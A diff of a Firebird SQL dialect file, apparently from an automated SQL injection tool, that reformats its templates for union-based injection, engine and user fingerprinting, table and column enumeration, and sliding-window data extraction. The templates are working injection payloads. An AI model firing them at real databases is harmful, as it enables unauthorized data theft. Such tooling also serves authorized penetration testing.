@@ -4,12 +4,12 @@
     <resource>
         <info>
 SELECT 
-    rdb$get_context('SYSTEM','ENGINE_VERSION')
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||rdb$get_context('SYSTEM','DB_NAME')
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||rdb$get_context('SYSTEM','CURRENT_USER')
-    ||'${TRAIL_SQL}'
+    rdb$get_context('SYSTEM', 'ENGINE_VERSION')
+    || '${ENCLOSE_VALUE_SQL}'
+    || rdb$get_context('SYSTEM', 'DB_NAME')
+    || '${ENCLOSE_VALUE_SQL}'
+    || rdb$get_context('SYSTEM', 'CURRENT_USER')
+    || '${TRAIL_SQL}'
 from rdb$database
         </info>
         <schema>
@@ -21,40 +21,40 @@ from rdb$database
  */
 select 
     '${ENCLOSE_VALUE_SQL}'
-    ||rdb$get_context('SYSTEM','DB_NAME')
-    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    || rdb$get_context('SYSTEM', 'DB_NAME')
+    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from rdb$database
 {limit}
             </database>
             <table>
 SELECT 
     '${ENCLOSE_VALUE_SQL}'
-    ||trim(rdb$relation_name)
-    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    || trim(rdb$relation_name)
+    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from rdb$relations
 {limit}
             </table>
             <column>
 SELECT 
     '${ENCLOSE_VALUE_SQL}'
-    ||trim(rdb$field_name)
-    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    || trim(rdb$field_name)
+    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from rdb$relation_fields
-where rdb$relation_name='${TABLE}'
+where rdb$relation_name = '${TABLE}'
 {limit}
             </column>
             <row>
                 <query> 
 SELECT 
     '${ENCLOSE_VALUE_SQL}'
-    ||${FIELDS}
-    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    || ${FIELDS}
+    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
 from ${TABLE}
 {limit}
                 </query>
                 <fields>
-                <field>trim(coalesce(${FIELD},''))</field>
-                <concat>||'%7f'||</concat>
+                <field>trim(coalesce(${FIELD}, ''))</field>
+                <concat>|| '%7f' ||</concat>
                 </fields>
             </row>
         </schema>
@@ -66,21 +66,32 @@ select
     /**
      * If reach end of string (${LEAD}i) then NULLIF nullifies the result
      */
-    '${LEAD}'||NULLIF(substring(
-        (${INJECTION})from
-        ${INDEX} for
-        65536
-    ),'${TRAIL_SQL}')from RDB$DATABASE
+    '${LEAD}'
+    || NULLIF(
+        substring(
+            (${INJECTION})
+            from ${INDEX} 
+            for 65536
+        ),
+        '${TRAIL_SQL}'
+    )
+    from RDB$DATABASE
             </slidingWindow>
-            <limit> ROWS ${LIMIT} TO ${LIMIT}</limit>
+            <limit>ROWS ${LIMIT} TO ${LIMIT}</limit>
             <failsafe>(1337${INDICE}7330%2b1)</failsafe>
-            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')</calibrator>
+            <calibrator>
+rpad(
+    '${CALIBRATOR_SQL}', 
+    1024, 
+    '${CALIBRATOR_SQL}'
+)
+            </calibrator>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${INDICES} from RDB$DATABASE</indices>
-            <capacity><![CDATA[(select '${LEAD}${INDICE}'||${CALIBRATOR}from RDB\$DATABASE)]]></capacity>
-            <orderBy> order by 1337</orderBy>
+            <indices>union select ${INDICES} from RDB$DATABASE</indices>
+            <capacity><![CDATA[(select '${LEAD}${INDICE}' || ${CALIBRATOR} from RDB\$DATABASE)]]></capacity>
+            <orderBy>order by 1337</orderBy>
         </normal>
     </strategy>
 </model>
